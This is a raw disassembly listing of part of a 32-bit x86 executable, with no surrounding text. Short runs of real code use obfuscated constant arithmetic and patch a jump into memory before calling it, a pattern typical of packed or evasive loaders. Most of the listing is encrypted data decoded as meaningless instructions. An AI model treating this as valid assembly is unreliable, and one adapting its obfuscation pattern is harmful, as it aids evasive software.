  40d533:	repnz fld QWORD PTR [eax+0xd662ff6]
  40d53a:	aas    
  40d53b:	sbb    BYTE PTR [edx+0x16],cl
  40d53e:	cmp    eax,0xe5581969
  40d543:	iret   
  40d544:	mov    edi,0x1e85b269
  40d549:	push   eax
  40d54a:	not    BYTE PTR [ecx+0x6d24f6d8]
  40d550:	pop    esp
  40d551:	out    0x7,eax
  40d553:	rcr    ebx,1
  40d555:	mov    al,ds:0x2ddd1985
  40d55a:	sbb    DWORD PTR [esi-0x30],0x7f8117d1
  40d561:	sbb    DWORD PTR [ebx-0x66],esi
  40d564:	xor    esp,edi
  40d566:	call   FWORD PTR [edi-0x7b]
  40d569:	push   ss
  40d56a:	mov    bl,BYTE PTR [ebx+0x615df2d8]
  40d570:	jge    0x40d5ed
  40d572:	scas   al,BYTE PTR es:[edi]
  40d573:	cmc    
  40d574:	popa   
  40d575:	mov    ?,WORD PTR [esi-0x75]
  40d578:	or     al,0xcf
  40d57a:	inc    ecx
  40d57b:	scas   eax,DWORD PTR es:[edi]
  40d57c:	imul   ecx,edi,0x6
  40d57f:	cwde   
  40d580:	dec    ebp
  40d581:	imul   eax,DWORD PTR [edx],0x34
  40d584:	push   ebx
  40d585:	aas    
  40d586:	xchg   ebp,eax
  40d587:	dec    esp
  40d588:	pusha  
  40d589:	jge    0x40d5ea
  40d58b:	int3   
  40d58c:	cwde   
  40d58d:	nop
  40d58e:	mov    eax,ds:0x25f1f934
  40d593:	pop    esi
  40d594:	jg     0x40d5d5
  40d596:	je     0x40d580
  40d598:	adc    BYTE PTR [ecx],bl
  40d59a:	pusha  
  40d59b:	cmc    
  40d59c:	xor    al,BYTE PTR [ecx-0x3d]
  40d59f:	inc    esp
  40d5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5a1:	and    eax,DWORD PTR [edx]
  40d5a3:	dec    ebp
  40d5a4:	mov    eax,DWORD PTR [ebp-0xc]
  40d5a7:	sub    ecx,eax
  40d5a9:	imul   ecx,ecx,0x7480
  40d5af:	add    ecx,DWORD PTR [ebp-0x58]
  40d5b2:	mov    eax,DWORD PTR [ebp-0x8]
  40d5b5:	push   ecx
  40d5b6:	mov    ecx,DWORD PTR [ebp-0x4]
  40d5b9:	lea    eax,[ecx+eax*1-0x1e6d]
  40d5c0:	mov    ecx,DWORD PTR [ebp-0x64]
  40d5c3:	xor    edx,edx
  40d5c5:	div    ecx
  40d5c7:	mov    ecx,DWORD PTR [ebp-0x74]
  40d5ca:	lea    eax,[eax+ecx*1-0xa617]
  40d5d1:	push   eax
  40d5d2:	mov    eax,DWORD PTR [ebp-0x88]
  40d5d8:	mov    ecx,DWORD PTR [ebp-0x84]
  40d5de:	push   0x770a
  40d5e3:	push   0x2a0c
  40d5e8:	push   ecx
  40d5e9:	push   eax
  40d5ea:	call   0x41594e
  40d5ef:	mov    ecx,DWORD PTR [ebp-0x98]
  40d5f5:	mov    esi,DWORD PTR [ebp-0x94]
  40d5fb:	push   esi
  40d5fc:	push   ecx
  40d5fd:	or     edx,0x615d
  40d603:	or     eax,0x455c
  40d608:	push   edx
  40d609:	push   eax
  40d60a:	call   0x4222a7
  40d60f:	mov    ecx,DWORD PTR [ebp-0x70]
  40d612:	mov    edx,DWORD PTR [ebp-0x6c]
  40d615:	xor    eax,ecx
  40d617:	mov    ecx,DWORD PTR [ebp-0x20]
  40d61a:	mov    edx,DWORD PTR [ebp-0x1c]
  40d61d:	mov    esi,DWORD PTR [ebp-0x80]
  40d620:	and    eax,0xb49
  40d625:	add    esi,0x629b
  40d62b:	lea    eax,[eax+ecx*1-0xfd]
  40d632:	xor    esi,0x4994
  40d638:	push   eax
  40d639:	lea    esi,[ebp+esi*1-0x3c93]
  40d640:	call   0x40dbf7
  40d645:	mov    ecx,eax
  40d647:	mov    eax,DWORD PTR [ebp-0x50]
  40d64a:	mov    edx,DWORD PTR [ebp-0x7c]
  40d64d:	sub    eax,0x161
  40d652:	xor    eax,edx
  40d654:	imul   eax,eax,0x5151
  40d65a:	add    eax,0x3901
  40d65f:	xor    eax,0x40c2
  40d664:	xor    edx,edx
  40d666:	mov    esi,0x218f6c45
  40d66b:	div    esi
  40d66d:	cmp    ecx,eax
  40d66f:	jne    0x40d7dc
  40d675:	mov    ecx,DWORD PTR [ebp-0x78]
  40d678:	xor    edx,edx
  40d67a:	mov    eax,0x209c
  40d67f:	div    ecx
  40d681:	mov    ecx,DWORD PTR ds:0x422728
  40d687:	mov    ecx,DWORD PTR [ecx+0x1a8]
  40d68d:	xor    edx,edx
  40d68f:	sub    ecx,eax
  40d691:	mov    eax,DWORD PTR [ebp-0x4c]
  40d694:	xor    eax,0x3daa
  40d699:	sub    eax,0x3375
  40d69e:	or     eax,0x6931
  40d6a3:	lea    eax,[ebp+eax*1-0x6c25]
  40d6aa:	push   eax
  40d6ab:	mov    eax,DWORD PTR [ebp-0x8c]
  40d6b1:	push   0x18
  40d6b3:	pop    esi
  40d6b4:	div    esi
  40d6b6:	mov    esi,DWORD PTR [ebp-0x60]
  40d6b9:	xor    edx,edx
  40d6bb:	div    esi
  40d6bd:	mov    edx,DWORD PTR [ebp-0x44]
  40d6c0:	mov    esi,DWORD PTR [ebp-0x34]
  40d6c3:	xor    eax,edx
  40d6c5:	xor    edx,edx
  40d6c7:	div    esi
  40d6c9:	imul   eax,eax,0x7d2a
  40d6cf:	sub    eax,0x928ded7
  40d6d4:	push   eax
  40d6d5:	mov    eax,ds:0x422728
  40d6da:	add    eax,0xaa
  40d6df:	push   eax
  40d6e0:	mov    eax,DWORD PTR [ebp-0x3c]
  40d6e3:	sub    ecx,eax
  40d6e5:	mov    eax,DWORD PTR [ebp-0x24]
  40d6e8:	push   DWORD PTR [ecx+eax*1+0xbd4]
  40d6ef:	call   0x41b447
  40d6f4:	mov    DWORD PTR [ebp-0x4],eax
  40d6f7:	mov    ecx,DWORD PTR ds:0x422830
  40d6fd:	lea    eax,[ebp+0x4]
  40d700:	mov    DWORD PTR [ecx*4+0x422828],eax
  40d707:	inc    DWORD PTR ds:0x422830
  40d70d:	mov    eax,DWORD PTR [ebp-0x4]
  40d710:	mov    eax,DWORD PTR [ebp-0x4]
  40d713:	xor    edx,edx
  40d715:	shld   edx,eax,0x2
  40d719:	shl    eax,0x2
  40d71c:	mov    ecx,0xcb79b576
  40d721:	mov    esi,0x9c2b8ae8
  40d726:	xor    eax,ecx
  40d728:	xor    edx,esi
  40d72a:	cmp    eax,ecx
  40d72c:	jne    0x40d746
  40d732:	cmp    edx,esi
  40d734:	jne    0x40d746
  40d73a:	mov    eax,0xcb79b572
  40d73f:	mov    edx,esi
  40d741:	jmp    0x40dbf1
  40d746:	lea    eax,[ebp-0x10]
  40d749:	mov    DWORD PTR [ebp-0x9c],eax
  40d74f:	mov    eax,DWORD PTR [ebp-0x54]
  40d752:	mov    DWORD PTR [ebp-0x10],eax
  40d755:	mov    eax,DWORD PTR [ebp-0x10]
  40d758:	mov    ecx,DWORD PTR [ebp-0x4]
  40d75b:	sub    eax,ecx
  40d75d:	mov    DWORD PTR [ebp-0x10],eax
  40d760:	mov    eax,DWORD PTR [ebp-0x20]
  40d763:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d766:	sub    DWORD PTR [ebp-0x10],eax
  40d769:	mov    eax,DWORD PTR [ebp-0x4]
  40d76c:	mov    DWORD PTR [eax],0x658776e9
  40d772:	mov    DWORD PTR [eax+0x4],0xab756547
  40d779:	mov    eax,DWORD PTR [ebp-0x10]
  40d77c:	mov    ecx,DWORD PTR [ebp-0x4]
  40d77f:	mov    DWORD PTR [ecx+0x1],eax
  40d782:	mov    eax,ds:0x4225a4
  40d787:	push   DWORD PTR [eax]
  40d789:	push   DWORD PTR ds:0x422818
  40d78f:	push   DWORD PTR ds:0x4225ac
  40d795:	push   DWORD PTR ds:0x4227f8
  40d79b:	push   DWORD PTR ds:0x42286c
  40d7a1:	push   0xa5069baa
  40d7a6:	push   0xa5069bae
  40d7ab:	push   DWORD PTR [ebp-0x5c]
  40d7ae:	mov    eax,DWORD PTR [ebp-0x4]
  40d7b1:	call   eax
  40d7b3:	mov    eax,DWORD PTR [edi]
  40d7b5:	mov    eax,DWORD PTR [ebp+0x8]
  40d7b8:	push   DWORD PTR [eax]
  40d7ba:	call   0x40e823
  40d7bf:	mov    eax,ds:0x422728
  40d7c4:	push   0x4
  40d7c6:	add    eax,0x1dc
  40d7cb:	push   eax
  40d7cc:	push   edi
  40d7cd:	call   0x411c08
  40d7d2:	mov    eax,0xcb79b57e
  40d7d7:	jmp    0x40d73f
  40d7dc:	mov    eax,0xcb79b576
  40d7e1:	mov    edx,0x9c2b8ae8
  40d7e6:	jmp    0x40dbf1
  40d7eb:	hlt    
  40d7ec:	scas   eax,DWORD PTR es:[edi]
  40d7ed:	je     0x40d848
  40d7ef:	mov    ah,0x9a
  40d7f1:	cld    
  40d7f2:	mov    eax,0x90d1c6c0
  40d7f7:	or     dl,BYTE PTR [ebx+0x4e]
  40d7fa:	sahf   
  40d7fb:	gs lock mov esi,0xbec492be
  40d802:	mov    esi,0x890b2027
  40d807:	mov    ecx,0xebcee783
  40d80c:	cmp    BYTE PTR [edi-0x59],bl
  40d80f:	push   eax
  40d810:	jl     0x40d85c
  40d812:	or     al,0x14
  40d814:	(bad)
  40d818:	fnstcw WORD PTR ds:0x31adec86
  40d81e:	popf   
  40d81f:	(bad)
  40d822:	scas   eax,DWORD PTR es:[edi]
  40d823:	push   edi
  40d824:	pop    ebx
  40d825:	inc    ebp
  40d826:	inc    ebx
  40d827:	mov    al,0xa5
  40d829:	push   0x6f
  40d82b:	pop    ebx
  40d82c:	jl     0x40d810
  40d82e:	pop    edi
  40d82f:	sbb    cl,BYTE PTR [eax+0x4e]
  40d832:	cld    
  40d833:	inc    esp
  40d834:	jp     0x40d7ef
  40d836:	clc    
  40d837:	ret    
  40d838:	popf   
  40d839:	xchg   edi,eax
  40d83a:	xchg   BYTE PTR [ebx],dh
  40d83c:	sbb    cl,BYTE PTR [edi-0x6d]
  40d83f:	ins    DWORD PTR es:[edi],dx
  40d840:	xor    eax,0xfdf76deb
  40d845:	add    eax,0xd1d8d95c
  40d84a:	mov    ds,WORD PTR [ebx-0x47]
  40d84d:	les    edx,FWORD PTR [edi-0x2e]
  40d850:	aaa    
  40d851:	inc    esp
  40d852:	icebp  
  40d853:	push   ecx
  40d854:	fld    QWORD PTR [edi-0x3f882c2]
  40d85a:	es dec ebp
  40d85c:	sub    al,0x2f
  40d85e:	lea    eax,[di+0x36]
  40d862:	pop    ss
  40d863:	dec    esp
  40d864:	pusha  
  40d865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d866:	inc    ebp
  40d867:	icebp  
  40d868:	pop    ebp
  40d869:	dec    esi
  40d86a:	ins    BYTE PTR es:[edi],dx
  40d86b:	ret    0xf16f
  40d86e:	push   esp
  40d86f:	and    esi,ebp
  40d871:	ds fs imul edx,eax,0xa7cf7af2
  40d879:	push   ss
  40d87a:	(bad)  
  40d87b:	lock std 
  40d87d:	sub    al,0xc9
  40d87f:	jmp    0x40d8dc
  40d881:	push   ecx
  40d882:	xchg   BYTE PTR [edi+0x40b5a107],ah
  40d888:	fiadd  DWORD PTR [edi-0x31]
  40d88b:	pop    ebx
  40d88c:	sbb    ebp,DWORD PTR [edx-0x744edd50]
  40d892:	inc    ebx
  40d893:	pop    esi
  40d894:	adc    ebx,ebp
  40d896:	lods   eax,DWORD PTR ds:[esi]
  40d897:	fwait
  40d898:	loope  0x40d8a7
  40d89a:	or     BYTE PTR [ebx-0x76],al
  40d89d:	fsubr  QWORD PTR [edi]
  40d89f:	popf   
  40d8a0:	xor    BYTE PTR [ecx-0x67],cl
  40d8a3:	shl    DWORD PTR [ecx],1
  40d8a5:	scas   al,BYTE PTR es:[edi]
  40d8a6:	sti    
  40d8a7:	lahf   
  40d8a8:	rol    BYTE PTR [ebx-0xa13c6b0],cl
  40d8ae:	dec    ecx
  40d8af:	xchg   edx,eax
  40d8b0:	cwde   
  40d8b1:	add    BYTE PTR ds:0x8992725f,al
  40d8b7:	xchg   edi,eax
  40d8b8:	push   edx
  40d8b9:	inc    ecx
  40d8ba:	add    esp,DWORD PTR [ecx-0x63308771]
  40d8c0:	adc    bh,ah
  40d8c2:	fdivr  QWORD PTR [ebx-0x7d657d04]
  40d8c8:	stos   DWORD PTR es:[edi],eax
  40d8c9:	lea    edi,[esi]
  40d8cb:	stos   DWORD PTR es:[edi],eax
  40d8cc:	inc    edx
  40d8cd:	fsubrp st(4),st
  40d8cf:	adc    al,bh
  40d8d1:	test   BYTE PTR [edi+ebp*1],bh
  40d8d4:	pop    es
  40d8d5:	xor    al,0xb7
  40d8d7:	imul   DWORD PTR [esi+ecx*2-0x58b796e6]
  40d8de:	push   edi
  40d8df:	fsubr  st(6),st
  40d8e1:	in     eax,dx
  40d8e2:	cmp    cl,BYTE PTR [eax]
  40d8e4:	hlt    
  40d8e5:	push   ebx
  40d8e6:	dec    ecx
  40d8e7:	stc    
  40d8e8:	jl     0x40d8f6
  40d8ea:	xchg   esp,eax
  40d8eb:	cmp    BYTE PTR ss:[eax-0x5977cd87],dh
  40d8f2:	push   ecx
  40d8f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8f4:	add    al,BYTE PTR [edi+0x8]
  40d8f7:	push   edx
  40d8f8:	push   esi
  40d8f9:	fisub  DWORD PTR [bp-0x45ea]
  40d8fe:	sub    eax,0xcb17dfca
  40d903:	rcl    BYTE PTR [esp+edx*8+0x5fa5fd77],cl
  40d90a:	aam    0x85
  40d90c:	cmp    BYTE PTR ds:0xa0fa,bl
  40d911:	jne    0x40d8c5
  40d913:	std    
  40d914:	and    eax,0x25f5adbb
  40d919:	and    bl,bl
  40d91b:	frstor [eax]
  40d91d:	sbb    al,dh
  40d91f:	arpl   bp,sp
  40d921:	in     eax,dx
  40d922:	cdq    
  40d923:	test   DWORD PTR [esp+ebp*1+0x58],0xc67821e6
  40d92b:	xchg   esp,eax
  40d92c:	das    
  40d92d:	out    dx,al
  40d92e:	push   edx
  40d92f:	and    bl,BYTE PTR [eax]
  40d931:	xlat   BYTE PTR ds:[ebx]
  40d932:	or     eax,0x53ab384b
  40d937:	push   eax
  40d938:	jns    0x40d8d8
  40d93a:	fcomp  st(3)
  40d93c:	das    
  40d93d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d93e:	mov    eax,ds:0xee62d790
  40d943:	and    ch,BYTE PTR [ebp+0x277bc8cf]
  40d949:	inc    ebp
  40d94a:	imul   esi,DWORD PTR [ebp-0x38],0xf82990ce
  40d951:	jmp    0x40d8e6
  40d953:	sbb    eax,0x3c1c58c7
  40d958:	push   ebx
  40d959:	mov    BYTE PTR [ebx+0x53],ah
  40d95c:	xlat   BYTE PTR ds:[ebx]
  40d95d:	loopne 0x40d9a4
  40d95f:	test   DWORD PTR [edx-0x1e6dbe7f],0xccc8da36
  40d969:	cmc    
  40d96a:	das    
  40d96b:	push   ebx
  40d96c:	int3   
  40d96d:	in     al,0x24
  40d96f:	mov    dl,dl
  40d971:	imul   esi,DWORD PTR [ebp-0x61585220],0xb
  40d978:	inc    edx
  40d979:	push   cs
  40d97a:	xchg   bh,bh
  40d97c:	sar    DWORD PTR [edx-0x31dc44c8],0x5a
  40d983:	(bad)  [ecx+0x54e47d9]
  40d989:	inc    ecx
  40d98a:	push   ebx
  40d98b:	mov    ch,0xbf
  40d98d:	mov    ch,0xd6
  40d98f:	or     eax,0xece30f45
  40d994:	outs   dx,DWORD PTR ds:[esi]
  40d995:	lock mov cl,0x4c
  40d998:	shl    DWORD PTR [edi],1
  40d99a:	cs pop si
  40d99d:	xor    WORD PTR [edi+0x3f],di
  40d9a1:	inc    DWORD PTR [edi]
  40d9a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9a4:	icebp  
  40d9a5:	adc    BYTE PTR [edx],cl
  40d9a7:	imul   BYTE PTR [ebx]
  40d9a9:	xchg   dh,al
  40d9ab:	sub    DWORD PTR [ebx-0x24],ecx
  40d9ae:	lea    edx,[esi]
  40d9b0:	test   eax,0x798bf4ba
  40d9b5:	push   0x6a28e1a6
  40d9ba:	pop    es
  40d9bb:	mov    dh,0x71
  40d9bd:	or     cl,0x51
  40d9c0:	adc    edi,DWORD PTR [esi+edi*2-0x3f]
  40d9c4:	push   esi
  40d9c5:	out    0x7d,eax
  40d9c7:	and    eax,0xcbe53761
  40d9cc:	arpl   cx,ax
  40d9ce:	or     bl,BYTE PTR [eax+0x43]
  40d9d1:	xchg   bh,dl
  40d9d3:	ret    
  40d9d4:	sbb    eax,0x1212c9ba
  40d9d9:	sbb    dl,BYTE PTR [ebx]
  40d9db:	std    
  40d9dc:	inc    esp
  40d9dd:	jb     0x40da09
  40d9df:	inc    edi
  40d9e0:	rol    DWORD PTR [edi-0x40],1
  40d9e3:	jne    0x40da64
  40d9e5:	jmp    0xbc4161b5
  40d9ea:	xchg   ebp,eax
  40d9eb:	loope  0x40da38
  40d9ed:	sub    DWORD PTR [ebp+ecx*1-0x45eb7586],edx
  40d9f4:	mov    WORD PTR [esi-0x3d355b88],gs
  40d9fa:	inc    ecx
  40d9fb:	jmp    0x40d9d3
  40d9fd:	dec    esi
  40d9fe:	mov    ecx,0xb1cf17ee
  40da03:	(bad)  [edx]
  40da05:	call   0x6f85:0x8325f296
  40da0c:	je     0x40d9bc
  40da0e:	pop    es
  40da0f:	jo     0x40d995
  40da11:	jnp    0x40d9e9
  40da13:	imul   ebx,DWORD PTR [esi],0xc467ecf5
  40da19:	dec    ecx
  40da1a:	cmp    al,0x5f
  40da1c:	ror    BYTE PTR [eax],cl
  40da1e:	rcl    DWORD PTR [eax+0x66ede42d],0x0
  40da25:	aaa    
  40da26:	das    
  40da27:	push   ebx
  40da28:	xchg   dh,bh
  40da2a:	bound  edx,QWORD PTR [ecx-0x35cf3c33]
  40da30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da31:	into   
  40da32:	add    BYTE PTR [ebx-0x661aacd1],ch
  40da38:	sbb    al,0x40
  40da3a:	mov    dl,BYTE PTR [edi]
  40da3c:	mov    esp,0x51e1b797
  40da41:	(bad)  
  40da42:	(bad)  
  40da43:	pop    ss
  40da44:	ja     0x40d9f7
  40da46:	lods   al,BYTE PTR ds:[esi]
  40da47:	xchg   edx,eax
  40da48:	pop    esp
  40da49:	movntps XMMWORD PTR [ebx+0x4],xmm0
  40da4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da4e:	mov    ch,0x7e
  40da50:	hlt    
  40da51:	(bad)  
  40da53:	add    eax,0x3de752f
  40da58:	int    0x24
  40da5a:	scas   eax,DWORD PTR es:[edi]
  40da5b:	out    0x8e,eax
  40da5d:	(bad)  
  40da5e:	sub    eax,0xbe44a7e4
  40da63:	add    DWORD PTR [edx+0x7f41e7de],edx
  40da69:	add    al,0xcf
  40da6b:	jns    0x40daa9
  40da6d:	pop    ebp
  40da6e:	sbb    ch,bh
  40da70:	xor    eax,0x7124eee9
  40da75:	fcomp  QWORD PTR [ecx+0x54dfdd61]
  40da7b:	xchg   ebx,eax
  40da7c:	xor    DWORD PTR ds:0x6cadd0,esi
  40da82:	int    0x27
  40da84:	push   es
  40da85:	mov    ds:0x99b7618,eax
  40da8a:	jae    0x40db00
  40da8c:	adc    ebp,DWORD PTR [eax+0x50581c1b]
  40da92:	in     al,0x30
  40da94:	pop    ds
  40da95:	cmp    DWORD PTR [ebx-0x4f],edi
  40da98:	and    edi,DWORD PTR [esi-0x1b]
  40da9b:	xchg   esp,eax
  40da9c:	cmp    ecx,DWORD PTR [ebp+0x6d]
  40da9f:	mov    esp,DWORD PTR [ecx-0x7a]
  40daa2:	pop    esi
  40daa3:	or     edi,DWORD PTR [edi]
  40daa5:	dec    ebx
  40daa6:	fstp   st(3)
  40daa8:	je     0x40db1f
  40daaa:	idiv   BYTE PTR [edi]
  40daac:	jecxz  0x40dad2
  40daae:	imul   ecx,DWORD PTR [ecx+0x2201d48],0x7a6a0813
  40dab8:	mov    al,ds:0x3d08201a
  40dabd:	sub    al,dh
  40dabf:	cwde   
  40dac0:	repz push cs
  40dac2:	cmp    DWORD PTR [edx+ecx*1+0x45a2f8cb],eax
  40dac9:	or     BYTE PTR [edi+edi*4+0x4737ef49],bl
  40dad0:	outs   dx,BYTE PTR ds:[esi]
  40dad1:	xchg   BYTE PTR [ebx+esi*8],ah
  40dad4:	rcr    DWORD PTR [esi],0x10
  40dad7:	jp     0x40db2b
  40dad9:	mov    al,ds:0xb4c586bd
  40dade:	push   cs
  40dadf:	adc    bl,dl
  40dae1:	and    BYTE PTR [esp+ebp*2],bl
  40dae4:	idiv   BYTE PTR [edi]
  40dae6:	fcomp  DWORD PTR ds:0x26ec88c2
  40daec:	mov    ebx,DWORD PTR [ecx+0x59]
  40daef:	int    0x8b
  40daf1:	mov    ds:0x2b7e25e6,eax
  40daf6:	sar    DWORD PTR [eax+0x3f],0x6e
  40dafa:	xchg   BYTE PTR [esi],cl
  40dafc:	pop    ecx
  40dafd:	pop    esp
  40dafe:	jp     0x40db6a
  40db00:	scas   eax,DWORD PTR es:[edi]
  40db01:	gs jae 0x40db09
  40db04:	out    0x9,al
  40db06:	inc    ebx
  40db07:	inc    ebp
  40db08:	xchg   DWORD PTR [ebx+ebp*8-0x523917dd],eax
  40db0f:	int    0x4a
  40db11:	daa    
  40db12:	pop    edi
  40db13:	nop
  40db14:	dec    edi
  40db15:	fcmovbe st,st(5)
  40db17:	into   
  40db18:	fcomp  DWORD PTR [ecx-0x78387737]
  40db1e:	sub    eax,0x28e56396
  40db23:	in     al,0x2f
  40db25:	mov    eax,ds:0x2d81361d
  40db2a:	and    ebp,DWORD PTR [eax-0x22]
  40db2d:	mov    ds:0x22ed3f4c,eax
  40db32:	(bad)  
  40db33:	into   
  40db34:	add    dl,BYTE PTR [eax-0x7f574d00]
  40db3a:	add    ah,BYTE PTR [ebx-0x36]
  40db3d:	std    
  40db3e:	mov    dl,0x2a
  40db40:	js     0x40dae7
  40db42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db43:	ffree  st(0)
  40db45:	mov    bl,BYTE PTR [eax-0x4b]
  40db48:	jle    0x40db80
  40db4a:	sbb    DWORD PTR [edi-0x28b64fb5],ecx
  40db50:	aas    
  40db51:	and    ah,BYTE PTR [esi]
  40db53:	shl    ebx,1
  40db55:	cmp    al,0x61
  40db57:	xor    DWORD PTR [edx-0x687a4edd],eax
  40db5d:	or     al,0x9f
  40db5f:	jb     0x40dbc8
  40db61:	xchg   ebp,eax
  40db62:	imul   esi,esi,0xffffffe5
  40db65:	add    BYTE PTR [edx+0x282932d2],bh
  40db6b:	in     al,dx
  40db6c:	repnz call 0xe9f9:0x5f488305
  40db74:	(bad)  
  40db75:	repz push edx
  40db77:	push   ecx
  40db78:	mov    edi,0x299b58d
  40db7d:	or     BYTE PTR [edx-0x1351dd33],0xa0
  40db84:	xchg   ebp,eax
  40db85:	(bad)  
  40db87:	retf   
  40db88:	dec    esi
  40db89:	rcr    cl,cl
  40db8b:	or     al,0xf5
  40db8d:	cmp    BYTE PTR [ebx+edx*4],ah
  40db90:	out    dx,al
  40db91:	xchg   edi,eax
  40db92:	sbb    DWORD PTR ds:0xaecf5750,esp
  40db98:	gs dec ebx
  40db9a:	arpl   WORD PTR [eax+0x5ee7b629],di
  40dba0:	mov    es,WORD PTR [edx]
  40dba2:	dec    ebp
  40dba3:	cmc    
  40dba4:	imul   edi,ecx,0xb
  40dba7:	ins    BYTE PTR es:[edi],dx
  40dba8:	call   FWORD PTR [esi+0x10080748]
  40dbae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbaf:	test   BYTE PTR [esp+esi*8+0x3b],bl
  40dbb3:	xchg   edx,eax
  40dbb4:	dec    ecx
  40dbb5:	mov    al,ds:0x45a4adbf
  40dbba:	out    0x82,eax
  40dbbc:	into   
  40dbbd:	stos   DWORD PTR es:[edi],eax
  40dbbe:	arpl   WORD PTR [eax+edi*4-0x5],di
  40dbc2:	mov    eax,0xdabaeff7
  40dbc7:	xchg   DWORD PTR [edx],edx
  40dbc9:	mov    esi,0xab1736ac
  40dbce:	sbb    eax,0x26288d49
  40dbd3:	and    edx,DWORD PTR [esi+ebp*2]
  40dbd6:	pop    edi
  40dbd7:	mov    ah,0x3a
  40dbd9:	push   cs
  40dbda:	into   
  40dbdb:	jp     0x40dc3d
  40dbdd:	pushf  
  40dbde:	mov    cl,0xb7
  40dbe0:	mov    esp,0x42aae945
  40dbe5:	test   eax,0xdedad4b0
  40dbea:	inc    ecx
  40dbeb:	push   edx
  40dbec:	xchg   edx,eax
  40dbed:	mov    esi,0x5ee00086
  40dbf2:	pop    ebx
  40dbf3:	leave  
  40dbf4:	ret    0x4
  40dbf7:	push   ebp
  40dbf8:	mov    ebp,esp
  40dbfa:	sub    esp,0x20
  40dbfd:	push   ebx
  40dbfe:	push   edi
  40dbff:	mov    DWORD PTR [ebp-0x8],0x522e
  40dc06:	mov    DWORD PTR [ebp-0x4],0x3dbd
  40dc0d:	mov    DWORD PTR [ebp-0x10],0x53f1
  40dc14:	mov    DWORD PTR [ebp-0xc],0x631b
  40dc1b:	jmp    0x40deaa
  40dc20:	dec    ebx
  40dc21:	pop    esi
  40dc22:	xchg   ebp,eax
  40dc23:	idiv   DWORD PTR [eax+edi*1-0x2a408d55]
  40dc2a:	push   ss
  40dc2b:	ror    DWORD PTR [ebx+0x50],1
  40dc2e:	dec    esi
  40dc2f:	sahf   
  40dc30:	cmp    eax,edi
  40dc32:	mov    esi,0xbec299be
  40dc37:	mov    esi,0x89073220
  40dc3c:	mov    ebx,0xb10a6d68
  40dc41:	add    eax,0xaa990398
  40dc46:	pushf  
  40dc47:	ficomp DWORD PTR [edi+ebp*1]
  40dc4a:	cmp    eax,0xa11b32ab
  40dc4f:	cmc    
  40dc50:	arpl   cx,ax
  40dc52:	xchg   al,al
  40dc54:	push   es
  40dc55:	bound  ecx,QWORD PTR [ebx]
  40dc57:	push   0xffffffdf
  40dc59:	test   DWORD PTR [ecx+eax*1-0x1b],ecx
  40dc5d:	dec    esp
  40dc5e:	fs std 
  40dc60:	pop    ebx
  40dc61:	rcr    DWORD PTR [ebx-0x57],1
  40dc64:	jecxz  0x40dc6b
  40dc66:	push   esi
  40dc67:	and    eax,0xcb7192e9
  40dc6c:	pop    edx
  40dc6d:	lahf   
  40dc6e:	cwde   
  40dc6f:	add    cl,BYTE PTR [esi-0xf5655c]
  40dc75:	in     eax,0x3a
  40dc77:	or     BYTE PTR [ebx-0x6fc40a1],al
  40dc7d:	lea    esi,[ecx+0x5d7e9520]
  40dc83:	fwait
  40dc84:	add    BYTE PTR [eax-0x6d],al
  40dc87:	mov    cl,0xf2
  40dc89:	(bad)  
  40dc8a:	repnz sub al,0x2a
  40dc8d:	loop   0x40dca6
  40dc8f:	jbe    0x40dc36
  40dc91:	(bad)  
  40dc92:	aaa    
  40dc93:	xchg   ecx,eax
  40dc94:	sbb    DWORD PTR fs:[esi+0x627efb54],ebp
  40dc9b:	int    0x77
  40dc9d:	movzx  edx,BYTE PTR [ecx-0x69]
  40dca1:	mov    bh,0xe5
  40dca3:	add    BYTE PTR [esi+eiz*2-0x1ac9e33],0x29
  40dcab:	mov    ebx,0x9b25379
  40dcb0:	sub    eax,0xd2b65874
  40dcb5:	dec    eax
  40dcb6:	test   DWORD PTR [ebx],edx
  40dcb8:	mov    ?,WORD PTR [ebx]
  40dcba:	fs inc esi
  40dcbc:	dec    eax
  40dcbd:	xchg   ebp,eax
  40dcbe:	jne    0x40dd1c
  40dcc0:	outs   dx,DWORD PTR ds:[esi]
  40dcc1:	pop    esp
  40dcc2:	(bad)  
  40dcc3:	loope  0x40dd18
  40dcc5:	imul   esp,DWORD PTR [ebp-0x6dd42591],0x7b
  40dccc:	sbb    al,0x8e
  40dcce:	jne    0x40dc91
  40dcd0:	stos   DWORD PTR es:[edi],eax
  40dcd1:	jnp    0x40dcd7
  40dcd3:	dec    edx
  40dcd4:	bnd ret 0x20e4
  40dcd8:	in     eax,0xc0
  40dcda:	xchg   edx,eax
  40dcdb:	xchg   esi,eax
  40dcdc:	ja     0x40dcf8
  40dcde:	dec    edx
  40dcdf:	mov    fs,WORD PTR [eax-0x435d95e2]
  40dce5:	adc    eax,0xdfc0bc41
  40dcea:	xor    edx,esp
  40dcec:	sub    BYTE PTR [edi+0x68],dh
  40dcef:	sbb    esp,edx
  40dcf1:	lods   eax,DWORD PTR ds:[esi]
  40dcf2:	test   eax,0x24187f6
  40dcf7:	push   ss
  40dcf8:	inc    ecx
  40dcf9:	shr    BYTE PTR [esi-0x3db5b933],0x72
  40dd00:	sahf   
  40dd01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd02:	iret   
  40dd03:	(bad)  
  40dd04:	pop    edi
  40dd05:	jp     0x40dd2e
  40dd07:	ficomp WORD PTR [edx]
  40dd09:	sbb    edx,DWORD PTR ds:0xf5ad95ae
  40dd0f:	add    bh,al
  40dd11:	inc    ebp
  40dd12:	and    ah,BYTE PTR [ecx+0x76]
  40dd15:	mov    ecx,0xc512e40e
  40dd1a:	inc    esp
  40dd1b:	daa    
  40dd1c:	addr16 popf 
  40dd1e:	pushf  
  40dd1f:	scas   al,BYTE PTR es:[edi]
  40dd20:	ss jecxz 0x40dd15
  40dd23:	out    0xde,al
  40dd25:	jl     0x40dcdc
  40dd27:	in     al,0x8a
  40dd29:	dec    esp
  40dd2a:	jns    0x40dcbc
  40dd2c:	cdq    
  40dd2d:	pop    es
